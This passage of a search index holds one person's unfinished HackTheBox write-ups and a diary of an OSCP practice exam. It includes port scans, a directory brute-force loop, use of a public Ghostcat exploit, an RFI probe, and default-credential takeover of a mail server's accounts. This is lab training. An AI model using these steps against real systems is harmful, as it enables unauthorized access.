49664/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49665/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49666/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49667/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49668/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49669/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Aggressive OS guesses: Microsoft Windows 10 1709 - 1909 (95%), Microsoft Windows Longhorn (94%), Microsoft Windows 10 1703 (93%), Microsoft Windows 7 SP1 (93%), Microsoft Windows 8 (93%), Microsoft Windows 10 1809 - 1909 (93%), Microsoft Windows 10 1511 (92%), Microsoft Windows Server 2008 R2 (92%), Microsoft Windows Server 2008 SP2 (92%), Microsoft Windows 8.1 Update 1 (92%) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).","title":"Breadcrumbs"},{"location":"HackTheBox/Work%20in%20Progress/Breadcrumbs/#breadcrumbs","text":"Still in progress","title":"Breadcrumbs"},{"location":"HackTheBox/Work%20in%20Progress/Breadcrumbs/#recon","text":"The tags on this box Windows SQL Injection JSON Source code review Difficulty: Hard","title":"Recon"},{"location":"HackTheBox/Work%20in%20Progress/Breadcrumbs/#port-scan","text":"22/tcp open ssh syn-ack ttl 127 OpenSSH for_Windows_7.7 (protocol 2.0) 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? syn-ack ttl 127 3306/tcp open mysql? syn-ack ttl 127 | mysql-info: |_ MySQL Error: Host '10.10.16.3' is not allowed to connect to this MariaDB server 5040/tcp open unknown syn-ack ttl 127 7680/tcp open pando-pub? syn-ack ttl 127 30117/tcp filtered unknown host-unreach from 10.10.16.1 ttl 64 49664/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49665/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49666/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49667/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49668/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49669/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Aggressive OS guesses: Microsoft Windows 10 1709 - 1909 (95%), Microsoft Windows Longhorn (94%), Microsoft Windows 10 1703 (93%), Microsoft Windows 7 SP1 (93%), Microsoft Windows 8 (93%), Microsoft Windows 10 1809 - 1909 (93%), Microsoft Windows 10 1511 (92%), Microsoft Windows Server 2008 R2 (92%), Microsoft Windows Server 2008 SP2 (92%), Microsoft Windows 8.1 Update 1 (92%) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).","title":"Port Scan"},{"location":"HackTheBox/Work%20in%20Progress/Grandpa/","text":"Grandpa \u00b6 Still in progress Recon \u00b6 The tags on this box Windows Patch Management Web Difficulty: Easy What gives?! I keep getting stuck on these easy ones. The only open port on this box is 80. It's running IIS 6.0 (I never checked for public exploits for this). I was able to connect with cadaver but unable to upload anything. (Maybe credentials are needed?)","title":"Grandpa"},{"location":"HackTheBox/Work%20in%20Progress/Grandpa/#grandpa","text":"Still in progress","title":"Grandpa"},{"location":"HackTheBox/Work%20in%20Progress/Grandpa/#recon","text":"The tags on this box Windows Patch Management Web Difficulty: Easy What gives?! I keep getting stuck on these easy ones. The only open port on this box is 80. It's running IIS 6.0 (I never checked for public exploits for this). I was able to connect with cadaver but unable to upload anything. (Maybe credentials are needed?)","title":"Recon"},{"location":"HackTheBox/Work%20in%20Progress/Kotarak/","text":"Kotarak \u00b6 Still in progress Recon \u00b6 The tags on this box Web Arbitrary file upload Difficulty: Hard Port Scan \u00b6 PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) 8009/tcp open ajp13 syn-ack ttl 63 Apache Jserv (Protocol v1.3) 8080/tcp open http syn-ack ttl 63 Apache Tomcat 8.5.5 60000/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu)) Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.8 (95%), Linux 4.4 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%) Ssh seems to be up to date, and I've heard advice in the past about doing webservers last (since they can take the longest.) So we will start by examining Apache Jserv Apache Jserv (ajp v1.3) \u00b6 According to Hacktricks.xyz CVE-2020-1938 'Ghostcat' If the AJP port is exposed, Tomcat might be susceptible to the Ghostcat vulnerability. Ghostcat is a LFI vulnerability, but somewhat restricted: only files from a certain path can be pulled. Still, this can include files like WEB-INF/web.xml which can leak important information like credentials for the Tomcat interface, depending on the server setup. EDB-48143 is a public ghostcat exploit. I breifly reviewed the python script and it appears the variables are given as arguments; there's nothing in the script that needs to be modified. Running the script with no arguments gives the usage: \u250c\u2500\u2500(nate@kali-Dell)-[~/hackthebox/kotarak/exploit] \u2514\u2500$ ./48143.py usage: 48143.py [-h] [-p PORT] [-f FILE] target 48143.py: error: too few arguments Now we need to define our arguments: - PORT: AJP is running on port 8009 - FILE: good point, we'll have to find a file worth reading. - target: the target is kotorak, which is at 10.10.10.55 FInding potentially sensitive files. \u00b6 Lets figure out what we can read with this. Looking through some of the scan results, I notice the following directories of interest: 302 0l 0w 0c http://10.10.10.55:8080/docs 302 0l 0w 0c http://10.10.10.55:8080/examples 200 22l 93w 21630c http://10.10.10.55:8080/favicon.ico 302 0l 0w 0c http://10.10.10.55:8080/host-manager 200 202l 498w 0c http://10.10.10.55:8080/index.jsp 302 0l 0w 0c http://10.10.10.55:8080/manager Now to scan each dir to see what files are in there. I put all the directory URLs in a file called urls and will use this file to run multiple feroxbuster scans with some powershell kung-fu. cat ./urls | %{feroxbuster -u $_ -t 10 -w /usr/share/seclists/Discovery/Web-Content/big.txt -x \"txt,html,php,asp,aspx,jsp\" -v -k -n -q -o \"/home/nate/hackthebox/kotarak/scans/tcp8080/tcp_8080_http_$($_.split('/')[3]).txt\"}","title":"Kotarak"},{"location":"HackTheBox/Work%20in%20Progress/Kotarak/#kotarak","text":"Still in progress","title":"Kotarak"},{"location":"HackTheBox/Work%20in%20Progress/Kotarak/#recon","text":"The tags on this box Web Arbitrary file upload Difficulty: Hard","title":"Recon"},{"location":"HackTheBox/Work%20in%20Progress/Kotarak/#port-scan","text":"PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) 8009/tcp open ajp13 syn-ack ttl 63 Apache Jserv (Protocol v1.3) 8080/tcp open http syn-ack ttl 63 Apache Tomcat 8.5.5 60000/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu)) Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.8 (95%), Linux 4.4 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%) Ssh seems to be up to date, and I've heard advice in the past about doing webservers last (since they can take the longest.) So we will start by examining Apache Jserv","title":"Port Scan"},{"location":"HackTheBox/Work%20in%20Progress/Kotarak/#apache-jserv-ajp-v13","text":"According to Hacktricks.xyz CVE-2020-1938 'Ghostcat' If the AJP port is exposed, Tomcat might be susceptible to the Ghostcat vulnerability. Ghostcat is a LFI vulnerability, but somewhat restricted: only files from a certain path can be pulled. Still, this can include files like WEB-INF/web.xml which can leak important information like credentials for the Tomcat interface, depending on the server setup. EDB-48143 is a public ghostcat exploit. I breifly reviewed the python script and it appears the variables are given as arguments; there's nothing in the script that needs to be modified. Running the script with no arguments gives the usage: \u250c\u2500\u2500(nate@kali-Dell)-[~/hackthebox/kotarak/exploit] \u2514\u2500$ ./48143.py usage: 48143.py [-h] [-p PORT] [-f FILE] target 48143.py: error: too few arguments Now we need to define our arguments: - PORT: AJP is running on port 8009 - FILE: good point, we'll have to find a file worth reading. - target: the target is kotorak, which is at 10.10.10.55","title":"Apache Jserv (ajp v1.3)"},{"location":"HackTheBox/Work%20in%20Progress/Kotarak/#finding-potentially-sensitive-files","text":"Lets figure out what we can read with this. Looking through some of the scan results, I notice the following directories of interest: 302 0l 0w 0c http://10.10.10.55:8080/docs 302 0l 0w 0c http://10.10.10.55:8080/examples 200 22l 93w 21630c http://10.10.10.55:8080/favicon.ico 302 0l 0w 0c http://10.10.10.55:8080/host-manager 200 202l 498w 0c http://10.10.10.55:8080/index.jsp 302 0l 0w 0c http://10.10.10.55:8080/manager Now to scan each dir to see what files are in there. I put all the directory URLs in a file called urls and will use this file to run multiple feroxbuster scans with some powershell kung-fu. cat ./urls | %{feroxbuster -u $_ -t 10 -w /usr/share/seclists/Discovery/Web-Content/big.txt -x \"txt,html,php,asp,aspx,jsp\" -v -k -n -q -o \"/home/nate/hackthebox/kotarak/scans/tcp8080/tcp_8080_http_$($_.split('/')[3]).txt\"}","title":"FInding potentially sensitive files."},{"location":"HackTheBox/Work%20in%20Progress/Nineveh/","text":"Nineveh \u00b6 still in progress Recon \u00b6 Tags for this box : LFI Web PHP Port knocking Difficulty: Medium Port scan \u00b6 PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Site doesn't have a title (text/html). | http-methods: |_ Supported Methods: POST OPTIONS GET HEAD |_http-server-header: Apache/2.4.18 (Ubuntu) 443/tcp open ssl/http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Site doesn't have a title (text/html). | http-methods: |_ Supported Methods: POST OPTIONS GET HEAD Nikto identified RFI OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/ I did a POC by hosting \"Hello Wolrd\" in a text file and trying to load it. The string doesn't appear anywhere on the info page. It seems like this exploit won't work on this box.","title":"Nineveh"},{"location":"HackTheBox/Work%20in%20Progress/Nineveh/#nineveh","text":"still in progress","title":"Nineveh"},{"location":"HackTheBox/Work%20in%20Progress/Nineveh/#recon","text":"Tags for this box : LFI Web PHP Port knocking Difficulty: Medium","title":"Recon"},{"location":"HackTheBox/Work%20in%20Progress/Nineveh/#port-scan","text":"PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Site doesn't have a title (text/html). | http-methods: |_ Supported Methods: POST OPTIONS GET HEAD |_http-server-header: Apache/2.4.18 (Ubuntu) 443/tcp open ssl/http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Site doesn't have a title (text/html). | http-methods: |_ Supported Methods: POST OPTIONS GET HEAD Nikto identified RFI OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/ I did a POC by hosting \"Hello Wolrd\" in a text file and trying to load it. The string doesn't appear anywhere on the info page. It seems like this exploit won't work on this box.","title":"Port scan"},{"location":"HackTheBox/Work%20in%20Progress/ScriptKiddie/","text":"Script Kiddie \u00b6 still in progress Recon \u00b6 The tags for this box Outdated software Difficulty: Easy Port scan \u00b6 Only 2 open ports on this one - 22 and 5000. Port 22 has SSH running and port 5000 is a werkzug (python) webserver. A recent piece of advice I heard is to enumerate the webserver last, because it's usually pretty complex and there's a lot of steps. So I checked for SSH exploits first. SSH doesn't really have a lot of useful exploits, and this version doesn't appear to have any public exploits. On to the webserver! The webserver homepage has a few hacking tools on it. Nmap, searchsploit, and msfvenom. I tried doing command injection using the ; and && operators to string multiple commands together. But each tool seems to screen for that and display a message about \"stop trying to hack me\". The msfvenom tool is interesting. A user can upload an msfvenom template and then run an msfvenom command. Note: Some process on the server will be executing with data provided by the user. I thought I was stuck so I started moving on but after taking these notes I think I should look closer at the msfvenom vector.","title":"Script Kiddie"},{"location":"HackTheBox/Work%20in%20Progress/ScriptKiddie/#script-kiddie","text":"still in progress","title":"Script Kiddie"},{"location":"HackTheBox/Work%20in%20Progress/ScriptKiddie/#recon","text":"The tags for this box Outdated software Difficulty: Easy","title":"Recon"},{"location":"HackTheBox/Work%20in%20Progress/ScriptKiddie/#port-scan","text":"Only 2 open ports on this one - 22 and 5000. Port 22 has SSH running and port 5000 is a werkzug (python) webserver. A recent piece of advice I heard is to enumerate the webserver last, because it's usually pretty complex and there's a lot of steps. So I checked for SSH exploits first. SSH doesn't really have a lot of useful exploits, and this version doesn't appear to have any public exploits. On to the webserver! The webserver homepage has a few hacking tools on it. Nmap, searchsploit, and msfvenom. I tried doing command injection using the ; and && operators to string multiple commands together. But each tool seems to screen for that and display a message about \"stop trying to hack me\". The msfvenom tool is interesting. A user can upload an msfvenom template and then run an msfvenom command. Note: Some process on the server will be executing with data provided by the user. I thought I was stuck so I started moving on but after taking these notes I think I should look closer at the msfvenom vector.","title":"Port scan"},{"location":"HackTheBox/Work%20in%20Progress/Solidstate/","text":"Solidstate \u00b6 still in progress Recon \u00b6 The tags for this box File Misconfiguration Web Difficulty: Medium Port scan \u00b6 PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0) 25/tcp open smtp syn-ack ttl 63 JAMES smtpd 2.3.2 |_smtp-commands: solidstate Hello nmap.scanme.org (10.10.16.3 [10.10.16.3]) 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.25 ((Debian)) | http-methods: |_ Supported Methods: HEAD GET POST OPTIONS |_http-title: Home - Solid State Security |_http-server-header: Apache/2.4.25 (Debian) 110/tcp open pop3 syn-ack ttl 63 JAMES pop3d 2.3.2 119/tcp open nntp syn-ack ttl 63 JAMES nntpd (posting ok) 4555/tcp open rsip? syn-ack ttl 63 Services \u00b6 The first thing I notice is JAMES. I've dealt with James in the OSCP lab and new what to look for. JAMES \u00b6 There's a remote admin tool running on port 4555. The default credentials root:root allow you to list all users and change their passwords if desired. I did this and started digging through mail. Users \u00b6 Messages \u00b6 Mindy's acct must be locked down, but also a password might be sitting in her email! The ability to log in with Mindy's account, along with EDB-50347 will give us a normal shell as the user Mindy (as apposed to the rbash session that's her default.) Enumeration \u00b6 LinPEAS \u00b6","title":"Solidstate"},{"location":"HackTheBox/Work%20in%20Progress/Solidstate/#solidstate","text":"still in progress","title":"Solidstate"},{"location":"HackTheBox/Work%20in%20Progress/Solidstate/#recon","text":"The tags for this box File Misconfiguration Web Difficulty: Medium","title":"Recon"},{"location":"HackTheBox/Work%20in%20Progress/Solidstate/#port-scan","text":"PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0) 25/tcp open smtp syn-ack ttl 63 JAMES smtpd 2.3.2 |_smtp-commands: solidstate Hello nmap.scanme.org (10.10.16.3 [10.10.16.3]) 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.25 ((Debian)) | http-methods: |_ Supported Methods: HEAD GET POST OPTIONS |_http-title: Home - Solid State Security |_http-server-header: Apache/2.4.25 (Debian) 110/tcp open pop3 syn-ack ttl 63 JAMES pop3d 2.3.2 119/tcp open nntp syn-ack ttl 63 JAMES nntpd (posting ok) 4555/tcp open rsip? syn-ack ttl 63","title":"Port scan"},{"location":"HackTheBox/Work%20in%20Progress/Solidstate/#services","text":"The first thing I notice is JAMES. I've dealt with James in the OSCP lab and new what to look for.","title":"Services"},{"location":"HackTheBox/Work%20in%20Progress/Solidstate/#james","text":"There's a remote admin tool running on port 4555. The default credentials root:root allow you to list all users and change their passwords if desired. I did this and started digging through mail.","title":"JAMES"},{"location":"HackTheBox/Work%20in%20Progress/Solidstate/#users","text":"","title":"Users"},{"location":"HackTheBox/Work%20in%20Progress/Solidstate/#messages","text":"Mindy's acct must be locked down, but also a password might be sitting in her email! The ability to log in with Mindy's account, along with EDB-50347 will give us a normal shell as the user Mindy (as apposed to the rbash session that's her default.)","title":"Messages"},{"location":"HackTheBox/Work%20in%20Progress/Solidstate/#enumeration","text":"","title":"Enumeration"},{"location":"HackTheBox/Work%20in%20Progress/Solidstate/#linpeas","text":"","title":"LinPEAS"},{"location":"OSCP%20practice%20exam/0.%20Intro/","text":"General \u00b6 Day 1 - The Exam \u00b6 Official start time: 7:30am 7:40 am \u00b6 Today (2/3/2022) I took time off work to do an OSCP practice exam. The practice exam consists of the following: 3 Active Directory HTB challenges. If I root all three I earn 40 points. No partial points awarded. 3 \"standard\" HTB challenges. 10 points granted for each flag. Each box has user and root flag. Can earn up to 60 points. Last night I finished scanning all the boxes and haven't looked at any of the scan results yet. This morning I woke up feeling a little groggy. I probably shouldn't have stayed up programming till 1am :D Helped get the kids ready for daycare, and now I'm getting started at 7:43. The plan is to fully review and feel out potential exploits for all the boxes before trying to exploit any of them. Webserver enum will come last. For the sake of simplicity We'll say I started at 7:30am, so I have until 7:29am tomorrow to complete this. 7:50 am \u00b6 Apparently I wasn't connected to VPN while scanning yesterday..... Adapt and overcome I guess :) - will start the morning by re-scanning each box. Going to have to pay attention to flow here and be sure to constantly be scanning something. 8:15 am \u00b6 I went and had a fried egg sandwitch (dang eggs got over-done) and brew another cup of coffee while this first box is being re-scanned. This is a rough start so far, but I'm calm and not panicky. 24 hours should be plenty of time to do everything I can. Plus I'm wearing a black hoody, so everything will be ok, right? 9 am \u00b6 Just finished my first pomodoro break (5 mins). I did some stretching, meditated, and got more coffee. Back to hackin! 9:30 am \u00b6 Just finishing second break. I'm starting to get a bit nervous that the failure to scan everything last night will kill my chances at completing this all in 24 hours. Guess we'll have to wait and see. HOOD UP. 9:50 am \u00b6 Just hit a bottleneck. Currently scanning box 3/6 with autorecon. It's still doing dirbuster and I'm hesitant to kill that. While the scan is running I've been prepping the documentation by filling out possible attack vectors for each box that has been scanned. I guess I could go back and look for public exploits (might be needed for initial foothold on some of these.) 10:03 am \u00b6 I've started my first long break (15 mins). Watching some funny Smosh videos on youtube to let my mind relax and forget about the chaos that's happening with this exam :) I was in the middle of collecting public exploits and felt like I could still going when break time came up. I started break to keep myself fresh; this is a marathon, not a sprint. Got up and moved around a bit to keep myself from getting chair fatigue. Looking at it....I'm actually doing pretty well for time. I'm almost 50% done with Recon in the first 2.5 hours (about 10% into the time limit) 10:19 am \u00b6 Break is over, I'm all caught up with enumeration up to the scan point. The only scan left is Dirbuster on Cronos (10.10.10.13). I'm going to kill it and hopefully not miss anything. Can always start it again later if I get stuck on this box. While the scan for the next box runs I'm going to take an early lunch. 11:44 am \u00b6 Back from lunch. I even showered. If I fail this, I'm going to blame the lack of black hoody during exploit. Everyone knows you gotta look like this while you're hacking: I ran into the bottleneck again. I'm going to let dirbuster run for about 30 mins and if NOTHING comes back in the 30 mins I think it's safe to abort. Alright, lets get back at it! 12:46 pm \u00b6 Time for another long (15min) break! Making good progress. Documenting/Enumertion is right behind the scanner. Scanning 5/6 and enumerating 5/6. I'm excited and nervous to start the weaponization/exploitation phase of these attacks. The active directory boxes will be interesting - I'm thinking of saving them for last since it's all or none. I can at least get some points with the standard boxes. Then hopefully I'll have enough time to figure out the AD boxes with some research. 1:25 pm \u00b6 I ended up extending my break, the mental fatigue is starting to set in. I may need to take a nap or something after this session. 1:35 pm \u00b6 Started scan 6/6 - going to take a long break/nap and hopefully come back ready to exploit! 4:26 pm \u00b6 I'm back to it. Had a good nap, ate some snacks. I'm not super excited to do this, but I'm ready. 6:47 pm \u00b6 Finally feel like I'm back in a groove. After my nap, the kids got home for the day, we had dinner together, and it took me a minute to get back into a flow state. Good to go now tho! May have to keep at it all night...approaching the 12 hour mark with no points yet :) 8:04 pm \u00b6 Past the 12 hour mark. Still no points. I just used my metasploit attempt and it failed....gonna go take a break. 10:32 pm \u00b6 Time for another break. I got 10 points! YAY 11:00 pm \u00b6 I'm back now, got some energy drinks and chips...Looks like tonight is going to be an all-nighter, havn't done this in a while. 12:04 pm \u00b6 2 monsters in, I've nearly exhausted all optoins for PE on the machine I got user on. Going to try one more thing then move on to the next machine. Break time (waiting for results from exploit suggester anyhow) Came back not even 10 mins later... back to windows PrivEsc :) 12:59 pm \u00b6 Time for another break. The monsters are kicking in, good thing I didn't have any more. 2:13 am \u00b6 Got another 10 points by getting user on cronos. So now I'm at 20! 20% of the way there with 5 hours left. 2:50 am \u00b6 Got another 10 points by getting root on cronos. Total points now 30. Taking another break....and another Monster. 3:10 am \u00b6 back to it....I'm getting really tired. This was wayyy easier in highschool :D 8:07 am \u00b6 Well, I crashed and just woke up. I feel ROUGH. No only did I fall asleep, but I wouldn't even have enough points to make the report worth it. I did lose quite a bit of time from the scanning fiasco...so I'm going to keep at it until 11am to see how I would have done without the lost time for re-scanning. But first, I need to recover. 11:03 am \u00b6 Well, it's official. My extended time is up and I haven't managed any more points. I'm still exhausted. I finished with 30 points, which means I would need to spend more money on a retake if this were the real exam. Lessons Learned. \u00b6 Validate your scanner is running before walking away. Don't assume it's working. You may not be connected to VPN. Pomodoro is helpful, but I need to be more disiplined on the length of breaks. During this test exam I started losing interest quickly. I'm not sure if I over-relaxed to avoid anxiety or what. It doesn't seem like burnout - today as the end got closer I got more and more pumped. Maybe I should be setting more rigorous SHORT TERM GOALS to keep me engaged. 24 hours is a long time to be engaged, and I felt myself having a procrastination mindset pretty early on. Get good sleep the night before. I saw this one online but ended up not following through. I have no idea what's going on with Active Directory Don't jump right in to credential stuffing; you could tip over the server. Also be sure to account for dynamic cookies; JUST USE BURP. That's it for now. I don't even have enough points to make the report worth while, so I'll finish up these boxes, add more to lessons learned, and then possibly do a report. Will need to study some AD hacking techniques. Then I suppose I should do another practice exam :) TTFN for now, guess I'll have to try harder <- great tune","title":"General"},{"location":"OSCP%20practice%20exam/0.%20Intro/#general","text":"","title":"General"},{"location":"OSCP%20practice%20exam/0.%20Intro/#day-1-the-exam","text":"Official start time: 7:30am","title":"Day 1  - The Exam"},{"location":"OSCP%20practice%20exam/0.%20Intro/#740-am","text":"Today (2/3/2022) I took time off work to do an OSCP practice exam. The practice exam consists of the following: 3 Active Directory HTB challenges. If I root all three I earn 40 points. No partial points awarded. 3 \"standard\" HTB challenges. 10 points granted for each flag. Each box has user and root flag. Can earn up to 60 points. Last night I finished scanning all the boxes and haven't looked at any of the scan results yet. This morning I woke up feeling a little groggy. I probably shouldn't have stayed up programming till 1am :D Helped get the kids ready for daycare, and now I'm getting started at 7:43. The plan is to fully review and feel out potential exploits for all the boxes before trying to exploit any of them. Webserver enum will come last. For the sake of simplicity We'll say I started at 7:30am, so I have until 7:29am tomorrow to complete this.","title":"7:40 am"},{"location":"OSCP%20practice%20exam/0.%20Intro/#750-am","text":"Apparently I wasn't connected to VPN while scanning yesterday..... Adapt and overcome I guess :) - will start the morning by re-scanning each box. Going to have to pay attention to flow here and be sure to constantly be scanning something.","title":"7:50 am"},{"location":"OSCP%20practice%20exam/0.%20Intro/#815-am","text":"I went and had a fried egg sandwitch (dang eggs got over-done) and brew another cup of coffee while this first box is being re-scanned. This is a rough start so far, but I'm calm and not panicky. 24 hours should be plenty of time to do everything I can. Plus I'm wearing a black hoody, so everything will be ok, right?","title":"8:15 am"},{"location":"OSCP%20practice%20exam/0.%20Intro/#9-am","text":"Just finished my first pomodoro break (5 mins). I did some stretching, meditated, and got more coffee. Back to hackin!","title":"9 am"},{"location":"OSCP%20practice%20exam/0.%20Intro/#930-am","text":"Just finishing second break. I'm starting to get a bit nervous that the failure to scan everything last night will kill my chances at completing this all in 24 hours. Guess we'll have to wait and see. HOOD UP.","title":"9:30 am"},{"location":"OSCP%20practice%20exam/0.%20Intro/#950-am","text":"Just hit a bottleneck. Currently scanning box 3/6 with autorecon. It's still doing dirbuster and I'm hesitant to kill that. While the scan is running I've been prepping the documentation by filling out possible attack vectors for each box that has been scanned. I guess I could go back and look for public exploits (might be needed for initial foothold on some of these.)","title":"9:50 am"},{"location":"OSCP%20practice%20exam/0.%20Intro/#1003-am","text":"I've started my first long break (15 mins). Watching some funny Smosh videos on youtube to let my mind relax and forget about the chaos that's happening with this exam :) I was in the middle of collecting public exploits and felt like I could still going when break time came up. I started break to keep myself fresh; this is a marathon, not a sprint. Got up and moved around a bit to keep myself from getting chair fatigue. Looking at it....I'm actually doing pretty well for time. I'm almost 50% done with Recon in the first 2.5 hours (about 10% into the time limit)","title":"10:03 am"},{"location":"OSCP%20practice%20exam/0.%20Intro/#1019-am","text":"Break is over, I'm all caught up with enumeration up to the scan point. The only scan left is Dirbuster on Cronos (10.10.10.13). I'm going to kill it and hopefully not miss anything. Can always start it again later if I get stuck on this box. While the scan for the next box runs I'm going to take an early lunch.","title":"10:19 am"},{"location":"OSCP%20practice%20exam/0.%20Intro/#1144-am","text":"Back from lunch. I even showered. If I fail this, I'm going to blame the lack of black hoody during exploit. Everyone knows you gotta look like this while you're hacking: I ran into the bottleneck again. I'm going to let dirbuster run for about 30 mins and if NOTHING comes back in the 30 mins I think it's safe to abort. Alright, lets get back at it!","title":"11:44 am"},{"location":"OSCP%20practice%20exam/0.%20Intro/#1246-pm","text":"Time for another long (15min) break! Making good progress. Documenting/Enumertion is right behind the scanner. Scanning 5/6 and enumerating 5/6. I'm excited and nervous to start the weaponization/exploitation phase of these attacks. The active directory boxes will be interesting - I'm thinking of saving them for last since it's all or none. I can at least get some points with the standard boxes. Then hopefully I'll have enough time to figure out the AD boxes with some research.","title":"12:46 pm"},{"location":"OSCP%20practice%20exam/0.%20Intro/#125-pm","text":"I ended up extending my break, the mental fatigue is starting to set in. I may need to take a nap or something after this session.","title":"1:25 pm"},{"location":"OSCP%20practice%20exam/0.%20Intro/#135-pm","text":"Started scan 6/6 - going to take a long break/nap and hopefully come back ready to exploit!","title":"1:35 pm"},{"location":"OSCP%20practice%20exam/0.%20Intro/#426-pm","text":"I'm back to it. Had a good nap, ate some snacks. I'm not super excited to do this, but I'm ready.","title":"4:26 pm"},{"location":"OSCP%20practice%20exam/0.%20Intro/#647-pm","text":"Finally feel like I'm back in a groove. After my nap, the kids got home for the day, we had dinner together, and it took me a minute to get back into a flow state. Good to go now tho! May have to keep at it all night...approaching the 12 hour mark with no points yet :)","title":"6:47 pm"},{"location":"OSCP%20practice%20exam/0.%20Intro/#804-pm","text":"Past the 12 hour mark. Still no points. I just used my metasploit attempt and it failed....gonna go take a break.","title":"8:04 pm"},{"location":"OSCP%20practice%20exam/0.%20Intro/#1032-pm","text":"Time for another break. I got 10 points! YAY","title":"10:32 pm"},{"location":"OSCP%20practice%20exam/0.%20Intro/#1100-pm","text":"I'm back now, got some energy drinks and chips...Looks like tonight is going to be an all-nighter, havn't done this in a while.","title":"11:00 pm"},{"location":"OSCP%20practice%20exam/0.%20Intro/#1204-pm","text":"2 monsters in, I've nearly exhausted all optoins for PE on the machine I got user on. Going to try one more thing then move on to the next machine. Break time (waiting for results from exploit suggester anyhow) Came back not even 10 mins later... back to windows PrivEsc :)","title":"12:04 pm"},{"location":"OSCP%20practice%20exam/0.%20Intro/#1259-pm","text":"Time for another break. The monsters are kicking in, good thing I didn't have any more.","title":"12:59 pm"},{"location":"OSCP%20practice%20exam/0.%20Intro/#213-am","text":"Got another 10 points by getting user on cronos. So now I'm at 20! 20% of the way there with 5 hours left.","title":"2:13 am"},{"location":"OSCP%20practice%20exam/0.%20Intro/#250-am","text":"Got another 10 points by getting root on cronos. Total points now 30. Taking another break....and another Monster.","title":"2:50 am"},{"location":"OSCP%20practice%20exam/0.%20Intro/#310-am","text":"back to it....I'm getting really tired. This was wayyy easier in highschool :D","title":"3:10 am"},{"location":"OSCP%20practice%20exam/0.%20Intro/#807-am","text":"Well, I crashed and just woke up. I feel ROUGH. No only did I fall asleep, but I wouldn't even have enough points to make the report worth it. I did lose quite a bit of time from the scanning fiasco...so I'm going to keep at it until 11am to see how I would have done without the lost time for re-scanning. But first, I need to recover.","title":"8:07 am"},{"location":"OSCP%20practice%20exam/0.%20Intro/#1103-am","text":"Well, it's official. My extended time is up and I haven't managed any more points. I'm still exhausted. I finished with 30 points, which means I would need to spend more money on a retake if this were the real exam.","title":"11:03 am"},{"location":"OSCP%20practice%20exam/0.%20Intro/#lessons-learned","text":"Validate your scanner is running before walking away. Don't assume it's working. You may not be connected to VPN. Pomodoro is helpful, but I need to be more disiplined on the length of breaks. During this test exam I started losing interest quickly. I'm not sure if I over-relaxed to avoid anxiety or what. It doesn't seem like burnout - today as the end got closer I got more and more pumped. Maybe I should be setting more rigorous SHORT TERM GOALS to keep me engaged. 24 hours is a long time to be engaged, and I felt myself having a procrastination mindset pretty early on. Get good sleep the night before. I saw this one online but ended up not following through. I have no idea what's going on with Active Directory Don't jump right in to credential stuffing; you could tip over the server. Also be sure to account for dynamic cookies; JUST USE BURP. That's it for now. I don't even have enough points to make the report worth while, so I'll finish up these boxes, add more to lessons learned, and then possibly do a report. Will need to study some AD hacking techniques. Then I suppose I should do another practice exam :) TTFN for now, guess I'll have to try harder <- great tune","title":"Lessons Learned."},{"location":"OSCP%20practice%20exam/1.%20Cascade/","text":"10.10.10.182 \u00b6 Recon \u00b6 Port scan \u00b6 PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-02-03 14:15:04Z) 135/tcp open 